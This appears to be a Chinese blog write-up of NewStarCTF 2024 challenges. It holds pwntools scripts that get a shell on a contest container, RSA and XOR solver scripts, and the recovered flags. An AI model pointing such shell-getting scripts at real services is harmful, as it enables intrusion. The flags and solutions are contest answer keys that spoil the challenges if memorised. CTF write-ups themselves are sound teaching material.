<p>有一位魔女坐着扫帚飞在空中，灰色头发在风中飘逸，这位像洋娃娃一般漂亮又可爱，连夏天的当空烈日见了都会放出更炙热光芒的少女，究竟是谁呢，没错就是我。</p>
<p>【难度：中等】</p>
</blockquote>
<p>在应用中可以发现提示</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://assets.bili33.top/img/NewStarCTF2024-Writeup/MuMuPlayer_MVL4Tr38N0.png"></p>
<p>所以把so拿出来逆向，然后就做不出了</p>
<h2 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h2><h3 id="Real-login"><a href="#Real-login" class="headerlink" title="Real login"></a>Real login</h3><p>通过IDA查看附件的文件，在<code>func</code>函数里面可以直接看到密码</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://assets.bili33.top/img/NewStarCTF2024-Writeup/ida64_UAkCwKJyd1.png"></p>
<p>所以nc一下容器，直接输入密码就可以得到shell了</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://assets.bili33.top/img/NewStarCTF2024-Writeup/WindowsTerminal_vfyptNPXbS.png"></p>
<h3 id="Game"><a href="#Game" class="headerlink" title="Game"></a>Game</h3><blockquote>
<p>不会连最简单的加法都不会吧</p>
<p>【难度：签到】</p>
</blockquote>
<p>使用IDA反编译可以看到返回shell的条件是v1的值大于999，而我们每次输入的值要在0-10之间才能继续输入</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://assets.bili33.top/img/NewStarCTF2024-Writeup/ida64_Y1jbIWSh20.png"></p>
<p>所以写一个Python脚本</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io = remote(<span class="string">&quot;8.147.128.74&quot;</span>, <span class="number">45354</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 等待服务器的初始输出</span></span><br><span class="line">io.recvuntil(<span class="string">b&quot;pls input you num:&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 初始化输入的数字和</span></span><br><span class="line">total = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 循环直到总和大于999</span></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="built_in">print</span>(total)</span><br><span class="line">        <span class="comment"># 等待服务器提示</span></span><br><span class="line">        io.recvuntil(<span class="string">b&quot;pls input you num:&quot;</span>, timeout=<span class="number">5</span>)</span><br><span class="line">        <span class="comment"># 继续输入10</span></span><br><span class="line">        io.sendline(<span class="string">b&#x27;10&#x27;</span>)</span><br><span class="line">        total += <span class="number">10</span></span><br><span class="line">        <span class="keyword">if</span> total &gt; <span class="number">999</span>:</span><br><span class="line">            io.interactive()</span><br><span class="line">    <span class="keyword">except</span> EOFError:</span><br><span class="line">        <span class="comment"># 切换到交互模式</span></span><br><span class="line">        io.interactive()</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://assets.bili33.top/img/NewStarCTF2024-Writeup/WindowsTerminal_O3rplTYesE.png"></p>
<p>然后ls一下发现flag就在当前目录，给cat出来就有了</p>
<h2 id="CRYPTO"><a href="#CRYPTO" class="headerlink" title="CRYPTO"></a>CRYPTO</h2><h3 id="Base"><a href="#Base" class="headerlink" title="Base"></a>Base</h3><blockquote>
<p>This is a base question!</p>
<p>4C4A575851324332474E324547554B494A5A4446513653434E564D444154545A4B354D45454D434E4959345536544B474D5134513D3D3D3D</p>
<p>【难度：签到】</p>
</blockquote>
<p>都说了是Base，但是没有Base的特征，看到尾巴3D连续，应该是十六进制码，先16进制转出来，发现是四个等号，猜Base32，还没出结果，再试试Base64，结束战斗，flag为<code>flag&#123;B@sE_0f_CrYpt0_N0W&#125;</code></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://assets.bili33.top/img/NewStarCTF2024-Writeup/msedge_OnsXNG2ta9.png"></p>
<h3 id="xor"><a href="#xor" class="headerlink" title="xor"></a>xor</h3><blockquote>
<p>如果再来一次的话，就能回到从前，一切都会好起来的</p>
<p>【难度：签到】</p>
</blockquote>
<p>xor就是异或嘛，异或的性质就是a^b&#x3D;c, a^c&#x3D;b, b^c&#x3D;a这样的，所以可以逆着回去，这里题目如下</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#As a freshman starting in 2024, you should know something about XOR, so this task is for you to sign in.</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> xor</span><br><span class="line"><span class="comment">#The Python pwntools library has a convenient xor() function that can XOR together data of different types and lengths</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> bytes_to_long</span><br><span class="line"></span><br><span class="line">key = <span class="string">b&#x27;New_Star_CTF&#x27;</span></span><br><span class="line">flag=<span class="string">&#x27;flag&#123;*******************&#125;&#x27;</span></span><br><span class="line"></span><br><span class="line">m1 = bytes_to_long(<span class="built_in">bytes</span>(flag[:<span class="number">13</span>], encoding=<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">m2 = flag[<span class="number">13</span>:]</span><br><span class="line"></span><br><span class="line">c1 = m1 ^ bytes_to_long(key)</span><br><span class="line">c2 = xor(key, m2)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;c1=&#x27;</span>,c1)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;c2=&#x27;</span>,c2)</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">c1= 8091799978721254458294926060841</span></span><br><span class="line"><span class="string">c2= b&#x27;;:\x1c1&lt;\x03&gt;*\x10\x11u;&#x27;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>可以得知c1异或的对象为<code>New_Star_CTF</code>编码后转成long数，且m1包含flag的前半部分，m2包含flag的后半部分</p>
<p>所以写一个解密脚本</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> xor</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes, bytes_to_long</span><br><span class="line"></span><br><span class="line"><span class="comment"># 已知数据</span></span><br><span class="line">c1 = <span class="number">8091799978721254458294926060841</span></span><br><span class="line">c2 = <span class="string">b&#x27;;:\x1c1&lt;\x03&gt;*\x10\x11u;&#x27;</span></span><br><span class="line">key = <span class="string">b&#x27;New_Star_CTF&#x27;</span></span><br><span class="line"></span><br><span class="line">m1 = long_to_bytes(c1 ^ bytes_to_long(key))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Part 1: &quot;</span>, m1)</span><br><span class="line"></span><br><span class="line">m2 = xor(key, c2)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Part 2: &quot;</span>, m2)</span><br><span class="line"></span><br><span class="line">flag = m1 + m2</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;flag: &quot;</span>, flag.decode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>就能够得到flag了</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://assets.bili33.top/img/NewStarCTF2024-Writeup/WindowsTerminal_HoFbxrV4ia.png"></p>
<h3 id="一眼秒了"><a href="#一眼秒了" class="headerlink" title="一眼秒了"></a>一眼秒了</h3><blockquote>
<p> n小小的也很可爱</p>
<p> 【难度：简单】</p>
</blockquote>
<p>提示我们n的值很小了，题目代码如下</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> serct <span class="keyword">import</span> flag</span><br><span class="line">p = getPrime(<span class="number">512</span>)</span><br><span class="line">q = getPrime(<span class="number">512</span>)</span><br><span class="line">n = p*q</span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">c = powmod(m, e, n)</span><br><span class="line"><span class="built_in">print</span>(n)</span><br><span class="line"><span class="built_in">print</span>(c)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 52147017298260357180329101776864095134806848020663558064141648200366079331962132411967917697877875277103045755972006084078559453777291403087575061382674872573336431876500128247133861957730154418461680506403680189755399752882558438393107151815794295272358955300914752523377417192504702798450787430403387076153</span></span><br><span class="line"><span class="comment"># 48757373363225981717076130816529380470563968650367175499612268073517990636849798038662283440350470812898424299904371831068541394247432423751879457624606194334196130444478878533092854342610288522236409554286954091860638388043037601371807379269588474814290382239910358697485110591812060488786552463208464541069</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>所以可以直接用计算机暴力破解，写出解密脚本</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> sympy <span class="keyword">import</span> factorint</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"></span><br><span class="line"><span class="comment"># 已知数据</span></span><br><span class="line">n = <span class="number">52147017298260357180329101776864095134806848020663558064141648200366079331962132411967917697877875277103045755972006084078559453777291403087575061382674872573336431876500128247133861957730154418461680506403680189755399752882558438393107151815794295272358955300914752523377417192504702798450787430403387076153</span></span><br><span class="line">c = <span class="number">48757373363225981717076130816529380470563968650367175499612268073517990636849798038662283440350470812898424299904371831068541394247432423751879457624606194334196130444478878533092854342610288522236409554286954091860638388043037601371807379269588474814290382239910358697485110591812060488786552463208464541069</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 因数分解 n</span></span><br><span class="line">factors = factorint(n)</span><br><span class="line"></span><br><span class="line">p, q = factors.keys()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;p: <span class="subst">&#123;p&#125;</span>\nq: <span class="subst">&#123;q&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 计算 φ(n)</span></span><br><span class="line">phi_n = (p - <span class="number">1</span>) * (q - <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 计算私钥 d</span></span><br><span class="line">d = <span class="built_in">pow</span>(e, -<span class="number">1</span>, phi_n)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 解密</span></span><br><span class="line">m = <span class="built_in">pow</span>(c, d, n)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 将长整型转换为字节</span></span><br><span class="line">flag = long_to_bytes(m)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;flag: &quot;</span>, flag.decode())</span><br></pre></td></tr></table></figure>

<p>然后就能得到flag：<code>flag&#123;9cd4b35a-affc-422a-9862-58e1cc3ff8d2&#125;</code></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://assets.bili33.top/img/NewStarCTF2024-Writeup/WindowsTerminal_XsVkDDHoN9.png"></p>
<h3 id="这是几次方？-疑惑！"><a href="#这是几次方？-疑惑！" class="headerlink" title="这是几次方？ 疑惑！"></a>这是几次方？ 疑惑！</h3><blockquote>
<p>^ w ^</p>
<p>^ 在python里面到底是什么意思？不如先看看大python 运算符号的优先级吧</p>
<p>【难度：简单】</p>
</blockquote>
<p><code>^</code>在Python中是异或运算符，而Python的运算符的顺序如下：</p>
<ul>
<li><strong>指数运算符 (<code>\**</code>)</strong></li>
<li><strong>按位取反 (<code>~</code>)、一元加 (<code>+</code>)、一元减 (<code>-</code>)</strong></li>
<li><strong>乘法 (<code>\*</code>)、除法 (<code>/</code>)、取整除 (<code>//</code>)、取模 (<code>%</code>)</strong></li>
<li><strong>加法 (<code>+</code>)、减法 (<code>-</code>)</strong></li>
<li><strong>按位移位运算 (<code>&lt;&lt;</code>, <code>&gt;&gt;</code>)</strong></li>
<li><strong>按位与 (<code>&amp;</code>)</strong></li>
<li><strong>按位异或 (<code>^</code>)</strong></li>
<li><strong>按位或 (<code>|</code>)</strong></li>
<li><strong>比较运算符 (<code>==</code>, <code>!=</code>, <code>&lt;=</code>, <code>&gt;=</code>, <code>&lt;</code>, <code>&gt;</code>)</strong></li>
</ul>
<p>所以根据我们拿到的题目代码</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">flag = <span class="string">b&#x27;flag&#123;*****&#125;&#x27;</span></span><br><span class="line">p = getPrime(<span class="number">512</span>)</span><br><span class="line">q = getPrime(<span class="number">512</span>)</span><br><span class="line">n = p*q</span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line"></span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line">c = <span class="built_in">pow</span>(m, e, n)</span><br><span class="line"></span><br><span class="line">hint = p^e + <span class="number">10086</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;c =&quot;</span>, c)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[n, e] =&quot;</span>, [n, e])</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;hint =&quot;</span>, hint)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">c = 36513006092776816463005807690891878445084897511693065366878424579653926750135820835708001956534802873403195178517427725389634058598049226914694122804888321427912070308432512908833529417531492965615348806470164107231108504308584954154513331333004804817854315094324454847081460199485733298227480134551273155762</span></span><br><span class="line"><span class="string">[n, e] = [124455847177872829086850368685666872009698526875425204001499218854100257535484730033567552600005229013042351828575037023159889870271253559515001300645102569745482135768148755333759957370341658601268473878114399708702841974488367343570414404038862892863275173656133199924484523427712604601606674219929087411261, 65537]</span></span><br><span class="line"><span class="string">hint = 12578819356802034679792891975754306960297043516674290901441811200649679289740456805726985390445432800908006773857670255951581884098015799603908242531673390</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>

<p>对于hint的计算，是先算了<code>e + 10086</code>再算<code>p ^ e</code>，所以我们逆着回去就行</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"></span><br><span class="line">c = <span class="number">36513006092776816463005807690891878445084897511693065366878424579653926750135820835708001956534802873403195178517427725389634058598049226914694122804888321427912070308432512908833529417531492965615348806470164107231108504308584954154513331333004804817854315094324454847081460199485733298227480134551273155762</span></span><br><span class="line">n = <span class="number">124455847177872829086850368685666872009698526875425204001499218854100257535484730033567552600005229013042351828575037023159889870271253559515001300645102569745482135768148755333759957370341658601268473878114399708702841974488367343570414404038862892863275173656133199924484523427712604601606674219929087411261</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">hint = <span class="number">12578819356802034679792891975754306960297043516674290901441811200649679289740456805726985390445432800908006773857670255951581884098015799603908242531673390</span></span><br><span class="line"></span><br><span class="line">p = hint ^ e + <span class="number">10086</span></span><br><span class="line">p = gmpy2.mpz(p)</span><br><span class="line"></span><br><span class="line">q = n // p</span><br><span class="line"></span><br><span class="line">phi_n = (p - <span class="number">1</span>) * (q - <span class="number">1</span>)</span><br><span class="line">d = inverse(e, phi_n)</span><br><span class="line"></span><br><span class="line">m = <span class="built_in">pow</span>(c, d, n)</span><br><span class="line">flag = long_to_bytes(m)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;flag:&quot;</span>, flag.decode())</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>然后就可以得到flag了，flag为<code>flag&#123;yihuo_yuan_lai_xian_ji_suan_liang_bian_de2333&#125;</code></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://assets.bili33.top/img/NewStarCTF2024-Writeup/Code_9YjRnTdHEs.png"></p>
<h3 id="Since-you-konw-something"><a href="#Since-you-konw-something" class="headerlink" title="Since you konw something"></a>Since you konw something</h3><blockquote>
<p>你见到了上周的老朋友，你只需告诉他一部分信息，他就会给你key</p>
</blockquote>
<p>题目给了我们一段Python代码</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> xor</span><br><span class="line"><span class="comment">#The Python pwntools library has a convenient xor() function that can XOR together data of different types and lengths</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> bytes_to_long</span><br><span class="line"></span><br><span class="line">key = ?? <span class="comment">#extremely short</span></span><br><span class="line">FLAG = <span class="string">&#x27;flag&#123;????????&#125;&#x27;</span></span><br><span class="line">c = bytes_to_long(xor(FLAG,key))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;c=&#123;&#125;&quot;</span>.<span class="built_in">format</span>(c))</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">c=218950457292639210021937048771508243745941011391746420225459726647571</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>

<p>因为告诉我们key很短，所以我就直接写爆破脚本</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> xor</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"><span class="keyword">from</span> tqdm <span class="keyword">import</span> tqdm</span><br><span class="line"></span><br><span class="line"><span class="comment"># Character set</span></span><br><span class="line">charset = <span class="string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789&#x27;</span></span><br><span class="line"></span><br><span class="line">c = <span class="number">218950457292639210021937048771508243745941011391746420225459726647571</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Calculate the number of combinations</span></span><br><span class="line">total_combinations = <span class="built_in">sum</span>(<span class="built_in">len</span>(charset) ** i <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">7</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> tqdm(total=total_combinations, desc=<span class="string">&quot;Processing combinations&quot;</span>) <span class="keyword">as</span> pbar:</span><br><span class="line">    <span class="comment"># Get all the combination in length 2~6</span></span><br><span class="line">    <span class="keyword">for</span> length <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">7</span>):</span><br><span class="line">        <span class="comment"># Generate the combination of length</span></span><br><span class="line">        <span class="keyword">for</span> key_tuple <span class="keyword">in</span> itertools.product(charset, repeat=length):</span><br><span class="line">            <span class="comment"># Convert to string</span></span><br><span class="line">            key = <span class="string">&#x27;&#x27;</span>.join(key_tuple)</span><br><span class="line">            </span><br><span class="line">            <span class="comment"># Decrypt</span></span><br><span class="line">            decoded_bytes = xor(long_to_bytes(c), key)</span><br><span class="line">            </span><br><span class="line">            <span class="comment"># Verify the result</span></span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                decoded_str = decoded_bytes.decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">            <span class="keyword">except</span> UnicodeDecodeError:</span><br><span class="line">                pbar.update(<span class="number">1</span>)  <span class="comment"># Update bar</span></span><br><span class="line">                <span class="keyword">continue</span>  <span class="comment"># continue if not valid</span></span><br><span class="line"></span><br><span class="line">            <span class="comment"># if start with &quot;flag&#123;&quot; then stop</span></span><br><span class="line">            <span class="keyword">if</span> decoded_str.startswith(<span class="string">&#x27;flag&#123;&#x27;</span>):</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;key: <span class="subst">&#123;key&#125;</span>&quot;</span>)</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;FLAG: <span class="subst">&#123;decoded_str&#125;</span>&quot;</span>)</span><br><span class="line">                pbar.close()  <span class="comment"># End bar</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">            <span class="comment"># Update bar</span></span><br><span class="line">            pbar.update(<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="comment"># Next length</span></span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="comment"># Result found</span></span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>很快就出来了，key为<code>ns</code>，flag为<code>flag&#123;Y0u_kn0w_th3_X0r_b3tt3r&#125;</code></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://assets.bili33.top/img/NewStarCTF2024-Writeup/WindowsTerminal_YCAk3oFlqk.png"></p>
<h3 id="Just-one-and-more-than-two"><a href="#Just-one-and-more-than-two" class="headerlink" title="Just one and more than two"></a>Just one and more than two</h3><blockquote>
<p>欸，少了少了？</p>
<p>【难度：中等】</p>
</blockquote>
<p>题目给了两个RSA的过程</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">flag = <span class="string">b&#x27;flag&#123;?????&#125;&#x27;</span></span><br><span class="line">m1 = bytes_to_long(flag[:<span class="built_in">len</span>(flag)//<span class="number">2</span>])</span><br><span class="line">m2 = bytes_to_long(flag[<span class="built_in">len</span>(flag)//<span class="number">2</span>:])</span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">p, q, r= (getPrime(<span class="number">512</span>) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>))</span><br><span class="line">N=p*q*r</span><br><span class="line">c1 = <span class="built_in">pow</span>(m1, e, p)</span><br><span class="line">c2 = <span class="built_in">pow</span>(m2, e, N)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;p=<span class="subst">&#123;p&#125;</span>\nq=<span class="subst">&#123;q&#125;</span>\nr=<span class="subst">&#123;r&#125;</span>\nc1=<span class="subst">&#123;c1&#125;</span>\nc2=<span class="subst">&#123;c2&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">p=11867061353246233251584761575576071264056514705066766922825303434965272105673287382545586304271607224747442087588050625742380204503331976589883604074235133</span></span><br><span class="line"><span class="string">q=11873178589368883675890917699819207736397010385081364225879431054112944129299850257938753554259645705535337054802699202512825107090843889676443867510412393</span></span><br><span class="line"><span class="string">r=12897499208983423232868869100223973634537663127759671894357936868650239679942565058234189535395732577137079689110541612150759420022709417457551292448732371</span></span><br><span class="line"><span class="string">c1=8705739659634329013157482960027934795454950884941966136315983526808527784650002967954059125075894300750418062742140200130188545338806355927273170470295451</span></span><br><span class="line"><span class="string">c2=1004454248332792626131205259568148422136121342421144637194771487691844257449866491626726822289975189661332527496380578001514976911349965774838476334431923162269315555654716024616432373992288127966016197043606785386738961886826177232627159894038652924267065612922880048963182518107479487219900530746076603182269336917003411508524223257315597473638623530380492690984112891827897831400759409394315311767776323920195436460284244090970865474530727893555217020636612445</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>

<p>所以直接解就可以了</p>
